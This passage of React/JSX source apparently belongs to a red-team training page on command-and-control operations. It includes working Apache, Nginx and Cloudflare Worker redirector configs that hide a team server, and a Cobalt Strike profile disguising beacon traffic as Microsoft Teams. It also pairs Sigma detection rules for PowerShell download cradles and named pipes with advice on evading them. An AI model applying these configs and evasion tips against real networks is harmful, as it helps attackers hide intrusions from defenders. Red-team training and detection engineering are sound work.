              <AccordionDetails>
                {/* Extended description */}
                {proto.longDescription && (
                  <Alert severity="info" icon={<LightbulbIcon />} sx={{ mb: 2 }}>
                    <Typography variant="body2">{proto.longDescription}</Typography>
                  </Alert>
                )}

                <Grid container spacing={2}>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "success.main", mb: 1 }}>Advantages</Typography>
                    <List dense>
                      {proto.pros.map((p, i) => (
                        <ListItem key={i} sx={{ py: 0.25 }}>
                          <ListItemIcon sx={{ minWidth: 20 }}>
                            <CheckCircleIcon sx={{ fontSize: 12, color: "success.main" }} />
                          </ListItemIcon>
                          <ListItemText primary={p} primaryTypographyProps={{ variant: "body2" }} />
                        </ListItem>
                      ))}
                    </List>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "error.main", mb: 1 }}>Disadvantages</Typography>
                    <List dense>
                      {proto.cons.map((c, i) => (
                        <ListItem key={i} sx={{ py: 0.25 }}>
                          <ListItemIcon sx={{ minWidth: 20 }}>
                            <WarningAmberIcon sx={{ fontSize: 12, color: "error.main" }} />
                          </ListItemIcon>
                          <ListItemText primary={c} primaryTypographyProps={{ variant: "body2" }} />
                        </ListItem>
                      ))}
                    </List>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "warning.main", mb: 1 }}>Detection Vectors</Typography>
                    <Typography variant="body2">{proto.detection}</Typography>
                  </Grid>

                  {/* Code Example */}
                  {proto.example && (
                    <Grid item xs={12}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Example Configuration</Typography>
                      <CodeBlock language="bash">{proto.example}</CodeBlock>
                    </Grid>
                  )}
                </Grid>
              </AccordionDetails>
            </Accordion>
          ))}

          {/* Traffic Pattern Examples */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Traffic Pattern Analysis</Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Understanding what C2 traffic looks like helps both offense (blending in) and defense (detection).
            </Typography>
            <Grid container spacing={2}>
              {trafficExamples.map((traffic, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Card sx={{ p: 2, height: "100%" }}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                      <NetworkCheckIcon sx={{ color: "primary.main" }} />
                      <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{traffic.name}</Typography>
                    </Box>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{traffic.description}</Typography>
                    <Typography variant="caption" sx={{ fontWeight: 600, color: "error.main" }}>Detection Indicators:</Typography>
                    <List dense>
                      {traffic.indicators.map((ind, i) => (
                        <ListItem key={i} sx={{ py: 0 }}>
                          <ListItemText primary={`• ${ind}`} primaryTypographyProps={{ variant: "caption" }} />
                        </ListItem>
                      ))}
                    </List>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>
        </Box>

      {/* Section: Infrastructure */}
      <Box id="infrastructure" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
          <CloudIcon sx={{ color: accent }} />
          Infrastructure
        </Typography>
        <Alert severity="info" sx={{ borderRadius: 2 }}>
          <AlertTitle>C2 Infrastructure Design</AlertTitle>
          Proper infrastructure setup is critical for operational security and mission success. A well-designed 
          C2 infrastructure protects your team server, provides redundancy, and helps blend into normal traffic.
        </Alert>

          {/* Infrastructure Overview */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Layered Infrastructure Model
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 3 }}>
              Professional C2 infrastructure uses multiple layers of separation. If one layer is compromised or 
              detected, you can burn it without losing your entire operation.
            </Typography>
            <CodeBlock>{`┌─────────────────────────────────────────────────────────────────────────────┐
│                              INTERNET                                        │
└───────────────────────────────────┬──────────────────────────────────────────┘
                                    │
        ┌───────────────────────────┼───────────────────────────┐
        │                           │                           │
        ▼                           ▼                           ▼
┌───────────────┐           ┌───────────────┐           ┌───────────────┐
│  Redirector   │           │  Redirector   │           │   Payload     │
│   (HTTPS)     │           │    (DNS)      │           │   Staging     │
│  cdn.target.  │           │  ns1.domain.  │           │  files.xyz.   │
│    com        │           │    com        │           │    com        │
└───────┬───────┘           └───────┬───────┘           └───────────────┘
        │                           │                         │
        │     Legitimate-looking    │                         │
        │        traffic only       │                         │
        │                           │                         │
        └───────────────┬───────────┘                         │
                        │                                     │
                        ▼                                     │
                ┌───────────────┐                             │
                │   Internal    │                             │
                │    VPN/       │  <───── Operator Access     │
                │  Jump Host    │                             │
                └───────┬───────┘                             │
                        │                                     │
                        ▼                                     │
                ┌───────────────┐                             │
                │  TEAM SERVER  │◄─────────────────────────────
                │   (Never      │
                │  exposed!)    │
                └───────────────┘

BURN ORDER: If compromised, burn from outside in.
  1. First: Payload Staging (short-lived anyway)
  2. Then: Redirectors (easily replaceable)
  3. Last Resort: Team Server (should never happen)`}</CodeBlock>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Infrastructure Components
            </Typography>
            <Grid container spacing={2}>
              {infrastructureComponents.map((comp, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Card sx={{ p: 2, height: "100%", border: `1px solid ${alpha(theme.palette.primary.main, 0.1)}` }}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                      {comp.icon}
                      <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{comp.component}</Typography>
                    </Box>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{comp.description}</Typography>
                    
                    {/* Extended description */}
                    {comp.longDescription && (
                      <Typography variant="body2" sx={{ mb: 2, p: 1, bgcolor: alpha(theme.palette.info.main, 0.05), borderRadius: 1 }}>
                        {comp.longDescription}
                      </Typography>
                    )}

                    <Typography variant="caption" sx={{ fontWeight: 600 }}>Key Considerations:</Typography>
                    <List dense>
                      {comp.considerations.map((c, i) => (
                        <ListItem key={i} sx={{ py: 0 }}>
                          <ListItemText primary={`• ${c}`} primaryTypographyProps={{ variant: "caption" }} />
                        </ListItem>
                      ))}
                    </List>

                    {/* Best Practices */}
                    {comp.bestPractices && comp.bestPractices.length > 0 && (
                      <>
                        <Typography variant="caption" sx={{ fontWeight: 600, color: "success.main" }}>Best Practices:</Typography>
                        <List dense>
                          {comp.bestPractices.map((bp, i) => (
                            <ListItem key={i} sx={{ py: 0 }}>
                              <ListItemIcon sx={{ minWidth: 16 }}>
                                <CheckCircleIcon sx={{ fontSize: 10, color: "success.main" }} />
                              </ListItemIcon>
                              <ListItemText primary={bp} primaryTypographyProps={{ variant: "caption" }} />
                            </ListItem>
                          ))}
                        </List>
                      </>
                    )}
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Redirector Configuration Examples
            </Typography>
            
            <Accordion defaultExpanded>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Apache mod_rewrite (HTTPS)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                  Apache-based redirectors use mod_rewrite to filter traffic and only forward legitimate C2 callbacks.
                </Typography>
                <CodeBlock language="apache">{`# /etc/apache2/sites-available/redirector.conf
<VirtualHost *:443>
    ServerName cdn.example.com
    
    SSLEngine On
    SSLCertificateFile /etc/ssl/certs/cert.pem
    SSLCertificateKeyFile /etc/ssl/private/key.pem
    
    RewriteEngine On
    
    # Logging for debugging (disable in production)
    RewriteLog "/var/log/apache2/rewrite.log"
    RewriteLogLevel 3
    
    # Condition 1: Must have correct URI pattern
    RewriteCond %{REQUEST_URI} ^/api/v1/status$ [OR]
    RewriteCond %{REQUEST_URI} ^/api/v1/update$
    
    # Condition 2: Must have correct User-Agent
    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0.*Chrome.*Safari"
    
    # Condition 3: Must be POST or GET
    RewriteCond %{REQUEST_METHOD} ^(GET|POST)$
    
    # If all conditions match, proxy to team server
    RewriteRule ^(.*)$ https://team-server.internal:443$1 [P,L]
    
    # IMPORTANT: Everything else goes to legitimate site
    # This makes the redirector look like a real CDN
    RewriteRule ^(.*)$ https://real-cdn-site.com [R=302,L]
</VirtualHost>`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Nginx Reverse Proxy</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock language="nginx">{`# /etc/nginx/sites-available/redirector
server {
    listen 443 ssl http2;
    server_name cdn.example.com;
    
    ssl_certificate /etc/ssl/certs/cert.pem;
    ssl_certificate_key /etc/ssl/private/key.pem;
    
    # Default: redirect to legitimate site
    location / {
        return 302 https://legitimate-site.com;
    }
    
    # C2 traffic patterns
    location ~ ^/api/v1/(status|update|config) {
        # Validate User-Agent
        if ($http_user_agent !~* "Mozilla.*Chrome.*Safari") {
            return 302 https://legitimate-site.com;
        }
        
        # Proxy to team server
        proxy_pass https://team-server.internal:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Cloudflare Workers (Serverless)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                  Using Cloudflare Workers as redirectors provides domain fronting-like capabilities.
                </Typography>
                <CodeBlock language="javascript">{`// Cloudflare Worker - deploy via wrangler
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const userAgent = request.headers.get('User-Agent') || ''
  
  // Validate request matches our C2 pattern
  const validPaths = ['/api/v1/status', '/api/v1/update']
  const validUA = userAgent.includes('Chrome') && userAgent.includes('Safari')
  
  if (validPaths.includes(url.pathname) && validUA) {
    // Forward to real team server (use a worker-specific endpoint)
    const teamServer = 'https://team-server.internal:443'
    const newUrl = teamServer + url.pathname + url.search
    
    return fetch(newUrl, {
      method: request.method,
      headers: request.headers,
      body: request.body
    })
  }
  
  // Invalid requests get redirected to legitimate site
  return Response.redirect('https://legitimate-site.com', 302)
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>
          </Paper>
        </Box>

      {/* Section: OPSEC */}
      <Box id="opsec" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
          <VisibilityOffIcon sx={{ color: accent }} />
          OPSEC
        </Typography>
        <Alert severity="warning" sx={{ borderRadius: 2 }}>
          <AlertTitle>Operational Security is Critical</AlertTitle>
          Poor OPSEC can burn operations, compromise infrastructure, alert defenders, and in worst cases,
          end careers. Every decision has OPSEC implications - always think like the defender.
        </Alert>

          {/* OPSEC Checklist */}
          <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#f59e0b", 0.02) }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Pre-Operation OPSEC Checklist
            </Typography>
            <Grid container spacing={2}>
              {[
                { item: "Custom malleable profile tested", critical: true },
                { item: "Redirectors deployed and tested", critical: true },
                { item: "Domain categorization verified", critical: true },
                { item: "Infrastructure not linked to personal/company accounts", critical: true },
                { item: "VPN/anonymization for operator traffic", critical: true },
                { item: "Sleep time and jitter configured appropriately", critical: false },
                { item: "Payload tested against target's known AV/EDR", critical: false },
                { item: "Fallback C2 channels configured", critical: false },
                { item: "Kill dates set on implants", critical: false },
                { item: "Team communication channels secure", critical: false },
              ].map((check, i) => (
                <Grid item xs={12} sm={6} key={i}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                    <Chip 
                      label={check.critical ? "CRITICAL" : "Important"} 
                      size="small" 
                      color={check.critical ? "error" : "warning"} 
                      variant="outlined"
                      sx={{ minWidth: 70 }}
                    />
                    <Typography variant="body2">{check.item}</Typography>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {opsecConsiderations.map((cat, idx) => (
            <Paper key={idx} sx={{ p: 3, borderRadius: 2 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 1 }}>{cat.category}</Typography>
              {cat.description && (
                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>{cat.description}</Typography>
              )}
              <Grid container spacing={2}>
                {cat.items.map((item, i) => (
                  <Grid item xs={12} md={6} key={i}>
                    <Box sx={{ p: 2, bgcolor: alpha(theme.palette.warning.main, 0.03), borderRadius: 1 }}>
                      <Box sx={{ display: "flex", alignItems: "flex-start", gap: 1 }}>
                        <VisibilityOffIcon sx={{ color: "warning.main", fontSize: 18, mt: 0.25 }} />
                        <Box>
                          <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
                            {typeof item === "object" ? item.tip : item}
                          </Typography>
                          {typeof item === "object" && item.detail && (
                            <Typography variant="body2" color="text.secondary" sx={{ mt: 0.5 }}>
                              {item.detail}
                            </Typography>
                          )}
                        </Box>
                      </Box>
                    </Box>
                  </Grid>
                ))}
              </Grid>
            </Paper>
          ))}

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Common OPSEC Failures & Lessons Learned
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              These are real mistakes that have burned operations. Learn from others' failures.
            </Typography>
            <Grid container spacing={2}>
              {[
                { mistake: "Default malleable profiles", impact: "Signature detection", lesson: "Always customize profiles for each engagement" },
                { mistake: "Predictable beaconing intervals", impact: "Traffic pattern analysis", lesson: "Use high jitter (30-50%) and variable sleep times" },
                { mistake: "Team server directly exposed", impact: "Infrastructure attribution", lesson: "Always use redirectors; team server should never touch internet" },
                { mistake: "Reusing domains across operations", impact: "Cross-operation correlation", lesson: "Fresh infrastructure for each engagement" },
                { mistake: "Running tools from disk", impact: "AV/EDR detection, forensic artifacts", lesson: "In-memory execution only; minimize disk touches" },
                { mistake: "Timestomping forgetting $MFT", impact: "Forensic timeline detection", lesson: "$MFT entries preserve original timestamps" },
                { mistake: "Using same C2 profile for all targets", impact: "Network detection rules trigger", lesson: "Customize traffic patterns per target environment" },
                { mistake: "Not cleaning up after operation", impact: "Persistence of implants, attribution", lesson: "Always have kill dates and cleanup procedures" },
              ].map((item, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Card sx={{ p: 2, height: "100%", border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
                    <Box sx={{ display: "flex", gap: 1, alignItems: "center", mb: 1 }}>
                      <WarningAmberIcon sx={{ color: "error.main", fontSize: 18 }} />
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "error.main" }}>{item.mistake}</Typography>
                    </Box>
                    <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
                      Impact: {item.impact}
                    </Typography>
                    <Typography variant="body2" sx={{ display: "flex", gap: 0.5, alignItems: "flex-start" }}>
                      <CheckCircleIcon sx={{ fontSize: 14, color: "success.main", mt: 0.25 }} />
                      {item.lesson}
                    </Typography>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Malleable C2 Profile OPSEC
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Malleable profiles define how your C2 traffic looks on the wire. Good profiles blend in; bad profiles get you caught.
            </Typography>
            <CodeBlock language="text">{`# Example: Making traffic look like Microsoft Teams API calls
# Cobalt Strike Malleable C2 Profile

set sample_name "Microsoft Teams";
set host_stage "false";
set jitter "37";
set sleeptime "45000";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

https-certificate {
    set CN       "teams.microsoft.com";
    set O        "Microsoft Corporation";
    set C        "US";
    set validity "365";
}

http-get {
    set uri "/api/chats/threads";
    
    client {
        header "Accept" "application/json";
        header "Authorization" "Bearer eyJ0eXAi..."; # Looks like real JWT
        
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "X-MS-Response-Type" "json";
        
        output {
            base64;
            prepend '{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#chats","value":[';
            append ']}';
            print;
        }
    }
}

# OPSEC Tips:
# - Match User-Agent to target's browser population
# - Use legitimate-looking URIs for the application you're mimicking  
# - Include expected headers for the service
# - Response should parse as valid JSON if inspected`}</CodeBlock>
          </Paper>
        </Box>

      {/* Section: Detection */}
      <Box id="detection" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
          <ShieldIcon sx={{ color: accent }} />
          Detection
        </Typography>
        <Alert severity="info" sx={{ borderRadius: 2 }}>
          <AlertTitle>Knowing Detection Helps Evasion</AlertTitle>
          Understanding how C2 is detected helps red teams improve their tradecraft. This section covers both
          perspectives - how defenders detect C2, and how to avoid those detections.
        </Alert>

          {/* Detection Overview */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Detection Categories Overview
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              C2 detection happens at multiple layers. Understanding each helps you evade them.
            </Typography>
            <Grid container spacing={2}>
              {[
                { layer: "Network", examples: "Proxy logs, DNS queries, Zeek/Suricata", icon: <NetworkCheckIcon sx={{ color: "#3b82f6" }} /> },
                { layer: "Endpoint", examples: "EDR, process monitoring, memory scanning", icon: <ComputerIcon sx={{ color: "#10b981" }} /> },
                { layer: "Behavioral", examples: "UEBA, ML anomaly detection, ATT&CK mapping", icon: <PsychologyIcon sx={{ color: "#8b5cf6" }} /> },
                { layer: "Threat Intel", examples: "IOC feeds, YARA rules, known signatures", icon: <FingerprintIcon sx={{ color: "#f59e0b" }} /> },
              ].map((item, i) => (
                <Grid item xs={12} sm={6} md={3} key={i}>
                  <Box sx={{ p: 2, bgcolor: alpha(theme.palette.primary.main, 0.03), borderRadius: 1, textAlign: "center" }}>
                    {item.icon}
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mt: 1 }}>{item.layer}</Typography>
                    <Typography variant="caption" color="text.secondary">{item.examples}</Typography>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {detectionMethods.map((method, idx) => (
            <Accordion key={idx} defaultExpanded={idx === 0}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <ShieldIcon sx={{ color: "info.main" }} />
                  <Typography variant="h6" sx={{ fontWeight: 700 }}>{method.method}</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>{method.description}</Typography>
                
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Detection Techniques</Typography>
                    <List dense>
                      {method.techniques.map((t, i) => (
                        <ListItem key={i} sx={{ py: 0.5, alignItems: "flex-start" }}>
                          <ListItemIcon sx={{ minWidth: 24, mt: 0.5 }}>
                            <ShieldIcon sx={{ fontSize: 14, color: "info.main" }} />
                          </ListItemIcon>
                          <ListItemText 
                            primary={typeof t === "object" ? t.name : t}
                            secondary={typeof t === "object" ? t.detail : undefined}
                            primaryTypographyProps={{ variant: "body2", fontWeight: 600 }}
                            secondaryTypographyProps={{ variant: "caption" }}
                          />
                        </ListItem>
                      ))}
                    </List>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Common Tools</Typography>
                    <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5, mb: 2 }}>
                      {method.tools.map((tool, i) => (
                        <Chip key={i} label={tool} size="small" variant="outlined" />
                      ))}
                    </Box>
                  </Grid>

                  {/* Sigma Example */}
                  {method.sigmaExample && (
                    <Grid item xs={12}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Example Sigma Rule</Typography>
                      <CodeBlock language="yaml">{method.sigmaExample}</CodeBlock>
                    </Grid>
                  )}
                </Grid>
              </AccordionDetails>
            </Accordion>
          ))}

          {/* Evasion Tips */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Evasion Strategies by Detection Type
            </Typography>
            <Grid container spacing={2}>
              {[
                { 
                  detection: "Signature-based", 
                  evasion: "Unique payloads, obfuscation, custom profiles",
                  detail: "Modify every known signature element. Never use defaults."
                },
                { 
                  detection: "Behavioral analysis", 
                  evasion: "Mimic legitimate apps, blend with normal traffic",
                  detail: "Study target environment's normal traffic patterns first."
                },
                { 
                  detection: "Network anomaly", 
                  evasion: "High jitter, business hours only, proper TLS",
                  detail: "Your traffic should look statistically similar to real users."
                },
                { 
                  detection: "Memory scanning", 
                  evasion: "Encrypted sleep, syscall unhooking, module stomping",
                  detail: "Modern EDRs scan memory - encrypt or hide when not executing."
                },
                { 
                  detection: "DNS monitoring", 
                  evasion: "Legitimate resolvers, proper TTLs, avoid TXT records",
                  detail: "DNS C2 is noisy - use only as fallback, not primary channel."
                },
                { 
                  detection: "Threat intel IOCs", 
                  evasion: "Fresh infrastructure, unique domains, no reuse",
                  detail: "Assume all IOCs are shared within hours of discovery."
                },
              ].map((item, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Card sx={{ p: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "error.main" }}>
                      Detection: {item.detection}
                    </Typography>
                    <Typography variant="body2" sx={{ fontWeight: 600, color: "success.main", mt: 1 }}>
                      Evasion: {item.evasion}
                    </Typography>
                    <Typography variant="caption" color="text.secondary" sx={{ display: "block", mt: 0.5 }}>
                      {item.detail}
                    </Typography>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* Additional Sigma Rules */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              More Detection Sigma Rules
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Understanding these rules helps you avoid triggering them.
            </Typography>
            
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>C2 Beaconing Pattern</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock language="yaml">{`title: Potential C2 Beaconing Activity
status: experimental
logsource:
    category: proxy
detection:
    selection:
        c-uri|re: '.*\\.(php|aspx|jsp)\\?[a-z]{1,3}=[A-Za-z0-9+/=]{20,}'
    timeframe: 1h
    condition: selection | count() by c-ip > 50
level: medium
tags:
    - attack.command_and_control
    - attack.t1071.001
    
# Evasion: Use legitimate-looking URIs, vary request patterns,
# avoid predictable base64 in parameters`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Cobalt Strike Named Pipe</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock language="yaml">{`title: Cobalt Strike Named Pipe Detection
logsource:
    category: pipe_created
    product: windows
detection:
    selection:
        PipeName|startswith:
            - '\\\\MSSE-'
            - '\\\\status_'
            - '\\\\postex_'
            - '\\\\msagent_'
    condition: selection
level: critical

# Evasion: Use pipename in malleable profile to customize
# Example: set pipename "Winsock2\\\\CatalogChangeListener-";`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Suspicious PowerShell</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock language="yaml">{`title: Suspicious PowerShell Download Cradle
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - 'powershell'
            - 'IEX'
        CommandLine|contains:
            - 'Net.WebClient'
            - 'DownloadString'
            - 'Invoke-WebRequest'
    condition: selection
level: high

# Evasion: Avoid well-known cradle patterns
# Use .NET directly, WinAPI, or alternative download methods`}</CodeBlock>
              </AccordionDetails>
            </Accordion>
          </Paper>
        </Box>

      {/* Section: Resources */}
      <Box id="resources" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
          <SchoolIcon sx={{ color: accent }} />
          Resources
        </Typography>
        <Paper sx={{ p: 3, borderRadius: 2 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
            Quick Reference Commands
          </Typography>
            
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Sliver</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.sliver}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Cobalt Strike</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.cobaltStrike}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Havoc</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.havoc}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Mythic</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.mythic}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Empire</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock>{quickCommands.empire}</CodeBlock>
              </AccordionDetails>
            </Accordion>
          </Paper>

          {/* Recommended Learning Path */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Recommended Learning Path
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Follow this progression to build solid C2 skills from beginner to advanced.
            </Typography>
            <Stepper orientation="vertical">
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>1. Foundations (Weeks 1-4)</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    Understand networking, protocols, and basic security concepts.
                  </Typography>
                  <List dense>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Learn TCP/IP, DNS, HTTP/HTTPS basics" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Set up a home lab (VMs: Kali, Windows Server, Domain)" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Practice with Metasploit (easy to learn, foundational)" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                  </List>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>2. Modern C2 Basics (Weeks 5-8)</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    Start with Sliver - it's free, modern, and well-documented.
                  </Typography>
                  <List dense>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Install and configure Sliver server" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Generate implants for different OSes" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Practice pivoting and lateral movement" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                  </List>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>3. Infrastructure & OPSEC (Weeks 9-12)</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    Learn to build production-grade infrastructure.
                  </Typography>
                  <List dense>
